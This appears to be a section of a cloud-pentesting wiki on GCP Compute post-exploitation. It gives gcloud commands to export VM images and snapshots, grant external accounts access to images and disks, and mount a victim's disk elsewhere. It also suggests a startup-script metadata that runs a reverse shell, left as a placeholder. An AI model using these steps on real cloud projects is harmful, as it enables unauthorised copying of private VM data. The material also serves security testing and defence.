## Compute

For more information about Compute and VPC (Networking) check:

### Export & Inspect Images locally

This would allow an attacker to **access the data contained inside already existing images** or **create new images of running VMs** and access their data without having access to the running VM.

It's possible to export a VM image to a bucket and then download it and mount it locally with the command:

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

Fore performing this action the attacker might need privileges over the storage bucket and for sure **privileges over cloudbuild** as it's the **service** which is going to be asked to perform the export\
Moreover, for this to work the codebuild SA and the compute SA needs privileged permissions.\
The cloudbuild SA `<project-id>@cloudbuild.gserviceaccount.com` needs:

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

And the SA `<project-id>-compute@developer.gserviceaccount.com` needs:

* oles/compute.storageAdmin
* roles/storage.objectAdmin

### Export & Inspect Snapshots & Disks locally

It's not possible to directly export snapshots and disks, but it's possible to **transform a snapshot in a disk, a disk in an image** and following the **previous section**, export that image to inspect it locally

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### Inspect an Image creating a VM

With the goal of accessing the **data stored in an image** or inside a **running VM** from where an attacker **has created an image,** it possible to grant an external account access over the image:

```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
  --member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
  --role='roles/compute.imageUser'
```

and then create a new VM from it:

```bash
gcloud compute instances create [INSTANCE_NAME] \
  --project=[TARGET_PROJECT_ID] \
  --zone=[ZONE] \
  --image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```

If you could not give your external account access over image, you could launch a VM using that image in the victims project and **make the metadata execute a reverse shell** to access the image adding the param:

```bash
    --metadata startup-script='#! /bin/bash
        echo "hello"; <reverse shell>'
```

### Inspect a Snapshot/Disk attaching it to a VM

With the goal of accessing the **data stored in a disk or a snapshot, you could transform the snapshot into a disk, a disk into an image and follow th preivous steps.**

Or you could **grant an external account access** over the disk (if the starting point is a snapshot give access over the snapshot or create a disk from it):

```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
  --member='user:[USER_EMAIL]' \
  --role='roles/compute.storageAdmin'
```

**Attach the disk** to an instance:

```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
  --disk [DISK_NAME] \
  --zone [ZONE]
```

Mount the disk inside the VM:

1.  **SSH into the VM**:

    ```sh
    gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
    ```
2. **Identify the Disk**: Once inside the VM, identify the new disk by listing the disk devices. Typically, you can find it as `/dev/sdb`, `/dev/sdc`, etc.
3. **Format and Mount the Disk** (if it's a new or raw disk):
   *   Create a mount point:

       ```sh
       sudo mkdir -p /mnt/disks/[MOUNT_DIR]
       ```
   *   Mount the disk:

       ```sh
       sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
       ```

If you **cannot give access to a external project** to the snapshot or disk, you might need to p**erform these actions inside an instance in the same project as the snapshot/disk**.
